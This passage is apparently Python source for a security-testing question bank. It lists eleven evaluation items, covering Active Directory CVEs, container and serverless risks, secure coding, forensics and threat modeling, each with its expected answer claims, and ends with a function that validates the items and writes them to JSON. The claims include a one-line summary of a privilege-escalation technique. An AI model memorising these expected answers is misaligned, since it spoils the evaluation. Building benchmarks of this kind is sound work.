        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-090",
        "domain": "WINDOWS_AD",
        "subdomain": "SAMACCOUNTNAME_SPOOFING",
        "category": "cve_analysis",
        "question": "Explain CVE-2021-42278 and CVE-2021-42287 (sAMAccountName spoofing) that allowed domain computer accounts to escalate to Domain Admin.",
        "expected_topics": ["CVE-2021-42278", "CVE-2021-42287", "sAMAccountName", "Kerberos PAC", "Active Directory Privilege Escalation"],
        "expected_sources": ["Microsoft Security Advisory", "NVD CVE-2021-42278"],
        "expected_claims": ["Renaming computer account to match Domain Controller without trailing dollar sign and requesting TGS yielded DC-level PAC ticket"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-091",
        "domain": "CLOUD",
        "subdomain": "SERVERLESS_SECURITY",
        "category": "conceptual",
        "question": "What security considerations apply to serverless functions (AWS Lambda) regarding execution context reuse and /tmp persistence?",
        "expected_topics": ["Serverless", "AWS Lambda", "Execution Context", "Warm Start", "/tmp directory persistence"],
        "expected_sources": ["AWS Lambda Security Overview", "OWASP Serverless Top 10"],
        "expected_claims": ["Subsequent invocations of warm container retain state in memory and files written to /tmp across user boundaries"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-092",
        "domain": "CLOUD",
        "subdomain": "DOCKER_SOCKET_MOUNT",
        "category": "conceptual",
        "question": "Why is mounting the host /var/run/docker.sock into a container equivalent to giving the container root access to the host?",
        "expected_topics": ["Docker Socket", "/var/run/docker.sock", "Container Breakout", "Daemon API", "Root Privileges"],
        "expected_sources": ["Docker Daemon Documentation", "CWE-250"],
        "expected_claims": ["Direct access to Docker daemon API allows creating new privileged containers with root host filesystem mounts"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },

    # --- METHODOLOGY, SECURE CODING & THREAT HUNTING (93-100) ---
    {
        "query_id": "VAPT-QB-093",
        "domain": "SECURE_CODING",
        "subdomain": "PARAMETRIZED_QUERIES",
        "category": "defensive_mitigation",
        "question": "Why do prepared statements and parameterized queries fundamentally prevent SQL injection while string sanitization frequently fails?",
        "expected_topics": ["Parameterized Queries", "Prepared Statements", "AST Parsing", "SQLi Prevention", "Separation of Code and Data"],
        "expected_sources": ["OWASP SQL Injection Prevention Cheat Sheet", "CWE-89"],
        "expected_claims": ["Prepared statements compile SQL command structure before binding parameters as literals, preventing payload interpretation as code"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-094",
        "domain": "SECURE_CODING",
        "subdomain": "MEMORY_SAFE_LANGUAGES",
        "category": "comparison",
        "question": "How does Rust's ownership and borrow checker guarantee memory safety without relying on a garbage collector?",
        "expected_topics": ["Rust", "Borrow Checker", "Ownership", "Lifetimes", "Memory Safety", "Use-After-Free Elimination"],
        "expected_sources": ["Rust Language Documentation", "NSA Cybersecurity Information Sheet"],
        "expected_claims": ["Enforces strict compile-time rules ensuring one mutable reference or multiple immutable references, eliminating UAF and data races"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-095",
        "domain": "SOC_DFIR",
        "subdomain": "KERBEROS_GOLDEN_TICKET",
        "category": "conceptual",
        "question": "What is a Kerberos Golden Ticket and how does resetting the krbtgt account password twice remediate it?",
        "expected_topics": ["Golden Ticket", "krbtgt", "Active Directory Remediation", "Kerberos TGT", "MITRE ATT&CK T1558.001"],
        "expected_sources": ["Microsoft Active Directory Forest Recovery Guide", "MITRE ATT&CK"],
        "expected_claims": ["Forging TGT using compromised krbtgt key grants arbitrary domain access; double password reset invalidates old and current keys"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-096",
        "domain": "SOC_DFIR",
        "subdomain": "MEMORY_FORENSICS",
        "category": "methodological",
        "question": "What volatile artifacts are analyzed during memory forensics with Volatility to detect code injection and hidden processes?",
        "expected_topics": ["Memory Forensics", "Volatility", "pslist vs psscan", "malfind", "VAD tree", "Injected DLLs"],
        "expected_sources": ["Volatility Foundation Guide", "SANS FOR508"],
        "expected_claims": ["malfind identifies memory segments with PAGE_EXECUTE_READWRITE permissions; psscan uncovers unlinked hidden processes"],
        "difficulty": "ADVANCED",
        "requires_deep_reasoning": True
    },
    {
        "query_id": "VAPT-QB-097",
        "domain": "VAPT_METHODOLOGY",
        "subdomain": "SCOPE_ENFORCEMENT",
        "category": "methodological",
        "question": "Why is strict deterministic ScopeGate enforcement mandatory before executing automated security testing tools in enterprise environments?",
        "expected_topics": ["ScopeGate", "Rules of Engagement", "Out-of-Scope Targets", "Authorization Boundaries", "Legal Safe Harbor"],
        "expected_sources": ["OWASP WSTG", "NIST SP 800-115", "Platform Invariants"],
        "expected_claims": ["Prevents illegal testing against third-party shared infrastructure and ensures actions remain within authorized scope"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-098",
        "domain": "VAPT_METHODOLOGY",
        "subdomain": "BURP_SUITE_EXTENSIONS",
        "category": "conceptual",
        "question": "How do HTTP proxy extensions (such as Burp Suite Montoya API or Python proxy scripts) automate request tampering during manual penetration tests?",
        "expected_topics": ["HTTP Proxy", "Burp Suite", "Montoya API", "Request Interception", "Passive Analysis"],
        "expected_sources": ["PortSwigger Montoya API Documentation"],
        "expected_claims": ["Inspects and programmatically modifies HTTP headers and request bodies on the fly between browser and server"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-099",
        "domain": "VAPT_METHODOLOGY",
        "subdomain": "THREAT_MODELING_STRIDE",
        "category": "conceptual",
        "question": "Explain Microsoft's STRIDE threat modeling methodology and how each element maps to a core security property.",
        "expected_topics": ["STRIDE", "Threat Modeling", "Spoofing", "Tampering", "Repudiation", "Information Disclosure", "DoS", "Elevation of Privilege"],
        "expected_sources": ["Microsoft Threat Modeling Guide", "OWASP Threat Modeling Cheat Sheet"],
        "expected_claims": ["STRIDE maps directly to violations of Authenticity, Integrity, Non-repudiation, Confidentiality, Availability, and Authorization"],
        "difficulty": "BEGINNER",
        "requires_deep_reasoning": False
    },
    {
        "query_id": "VAPT-QB-100",
        "domain": "VAPT_METHODOLOGY",
        "subdomain": "EVIDENCE_LINEAGE",
        "category": "methodological",
        "question": "Why is cryptographic evidence lineage required to validate that an AI model hypothesis is grounded in actual target observations?",
        "expected_topics": ["Evidence Lineage", "FACT vs HYPOTHESIS", "Cryptographic Provenance", "SHA-256 Chain", "Epistemic Boundaries"],
        "expected_sources": ["Milestone M8 Platform Security Invariants", "NIST AI Risk Management Framework"],
        "expected_claims": ["Cryptographic SHA-256 lineage traces every claim to a verified observation, preventing model hallucination promotion"],
        "difficulty": "INTERMEDIATE",
        "requires_deep_reasoning": False
    }
]


def generate_vapt_query_bank(output_path: str = "data/knowledge/vapt_query_bank.json") -> List[Dict[str, Any]]:
    """Builds and validates the 100-query VAPT Query Bank."""
    all_queries = CURATED_100_QUERIES + ADDITIONAL_QUERIES
    assert len(all_queries) == 100, f"Expected exactly 100 queries, found {len(all_queries)}"
    
    # Validate each item with Pydantic
    validated: List[Dict[str, Any]] = []
    seen_ids = set()
    for q in all_queries:
        assert q["query_id"] not in seen_ids, f"Duplicate query_id {q['query_id']}"
        seen_ids.add(q["query_id"])
        
        # Populate alias fields
        q_copy = dict(q)
        if not q_copy.get("expected_answer_characteristics"):
            q_copy["expected_answer_characteristics"] = q_copy.get("expected_claims", [])
        if not q_copy.get("expected_source_classes"):
            q_copy["expected_source_classes"] = q_copy.get("expected_sources", ["AUTHORITATIVE"])
        if not q_copy.get("expected_epistemic_status"):
            q_copy["expected_epistemic_status"] = "GENERAL_VAPT_KNOWLEDGE"

        item = VaptQueryItem(**q_copy)
        validated.append(item.model_dump())
        
    out_file = Path(output_path)
    out_file.parent.mkdir(parents=True, exist_ok=True)
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(validated, f, indent=2)
        
    return validated


if __name__ == "__main__":
    generate_vapt_query_bank()
    print("Successfully generated data/knowledge/vapt_query_bank.json with 100 validated queries.")
